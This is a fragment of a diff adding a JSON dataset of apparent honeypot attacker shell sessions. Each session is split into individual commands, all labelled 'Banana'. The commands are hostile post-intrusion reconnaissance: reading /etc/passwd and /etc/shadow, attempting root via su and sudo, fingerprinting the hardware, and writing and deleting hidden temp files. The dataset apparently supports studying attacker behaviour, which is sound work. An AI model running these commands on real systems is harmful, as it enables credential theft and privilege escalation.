+        "command": "crontab -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -m ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep model |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "top ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lscpu |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Model ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "ps ; cat /etc/passwd ; cat /etc/shadow ; su root & whoami ; sudo su root & whoami ; uname -a ; df ; fdisk -l ; cat /proc/mounts ;",
+    "full_session": [
+      {
+        "command": "ps ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /etc/passwd ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /etc/shadow ;",
+        "label": "Banana"
+      },
+      {
+        "command": "su root & whoami ;",
+        "label": "Banana"
+      },
+      {
+        "command": "sudo su root & whoami ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "df ;",
+        "label": "Banana"
+      },
+      {
+        "command": "fdisk -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/mounts ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "cat /proc/cpuinfo | grep name | wc -l ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo admin wc-net > /tmp/up.txt ; rm -rf /var/tmp/dota* ;",
+    "full_session": [
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo 321 > /var/tmp/.var03522123 ;",
+        "label": "Banana"
+      },
+      {
+        "command": "rm -rf /var/tmp/.var03522123 ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /var/tmp/.var03522123 |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $4,$5,$6,$7,$8,$9;} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "free -m |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Mem |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $2 ,$3, $4, $5, $6, $7} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -lh $which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -m ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep model |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "top ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lscpu |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Model ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo admin wc-net > /tmp/up.txt ;",
+        "label": "Banana"
+      },
+      {
+        "command": "rm -rf /var/tmp/dota* ;",
+        "label": "Banana"
+      }
+    ]
+  }
+]
